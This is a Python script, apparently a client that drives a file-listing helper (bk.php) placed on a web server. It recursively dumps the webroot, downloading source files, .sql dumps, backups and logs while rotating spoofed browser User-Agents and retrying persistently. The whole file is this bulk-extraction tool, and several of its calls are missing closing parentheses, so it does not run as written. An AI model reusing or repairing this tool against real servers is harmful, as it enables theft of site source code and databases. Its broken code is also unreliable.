#-*- coding=utf-8 -*-
'''
@Author: 
@Date: 2019-12-23 18:58:26
@LastEditTime : 2019-12-24 19:01:36
@LastEditors  : Please set LastEditors
@Description: In User Settings Edit
@FilePath: /bkfile/down_file.py
'''
import sys
if sys.version_info < (3, 0):
    sys.stdout.write("Sorry, bkfile requires Python 3.x\n")
    sys.exit(1)
import requests
import os
import random
import optparse
from pathlib import Path
import time
from retrying import retry
user_agent_list = [
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) '
    'Chrome/45.0.2454.85 Safari/537.36 115Browser/6.0.3',
    'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50',
    'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50',
    'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0)',
    'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)',
    'Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
    'Opera/9.80 (Windows NT 6.1; U; en) Presto/2.8.131 Version/11.11',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11',
    'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; SE 2.X MetaSr 1.0; SE 2.X MetaSr 1.0; .NET CLR 2.0.50727; SE 2.X MetaSr 1.0)',
    'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0',
    'Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
]
extentions=['.php','.bak','.jsp','.csv','.asp','.asa','.php4','.sql','.txt','.html','.jpg','.png','.gif','.tpl','.log']
current_path=os.path.abspath(os.path.dirname(__file__))
def file_extension(path): 
    return os.path.splitext(path)[1] 

@retry(stop_max_attempt_number=40,wait_fixed=10000)
def get_html(url,path): 
    user_agent = random.choice(user_agent_list)
    headers = {}
    headers["User-Agent"]=user_agent
    if "is_file" in path:
        data={'file':path.replace("is_file:","").strip()}   
    else:
        data={'path':path.replace("is_directory:","").strip()}             
    r=requests.post(url,data=data,headers=headers,timeout=5)
    if r.status_code==200:
        return r.text
    else:
        return ""
            

def get_file(url,path):
    print(path)
    if 'is_file' not in path:
        if not os.path.isfile(current_path+path):
            if "is_directory:" in path:
                path2=path.replace("is_directory:","").strip()
            else:
                path2=path
            if not os.path.exists(current_path+"/"+path2.replace(":","")):

                os.makedirs(os.path.abspath(current_path+"/"+path2.replace(":",""))
        html=get_html(url,path)
        paths=html.split("::::::")
        paths.pop()
        for line in paths:
            get_file(url,line)
    else:
        my_file = Path(os.path.abspath(current_path+"/"+path.replace("is_file:","").strip())
        if my_file.exists():
            return
        if file_extension(os.path.abspath(current_path+"/"+path.replace("is_file:","").strip()) in extentions:
            html=get_html(url,path)
            if html!=None:
                with open(os.path.abspath(current_path+"/"+path.replace("is_file:","").replace(":","").strip(),'w') as af:
                    af.write(html)
                    af.flush()
        else:
            pass
            
def main():
    usage = "usage: %prog -p '/aaa/bbb/ccc' -u 'http://127.0.0.1/bk.php'"
    parser = optparse.OptionParser(usage=usage)
    parser.add_option('-p','--path',dest='path',type=str,help='Enter the path of webroot')  
    parser.add_option('-u','--url',dest='url',type=str,help='Enter url of bk.php')  
    option,args=parser.parse_args()
    print(option)
    if option.url and option.path:
        get_file(option.url,option.path)
    else:
        parser.error("incorrecter of arguments")
    

if __name__=='__main__':
    main()



            

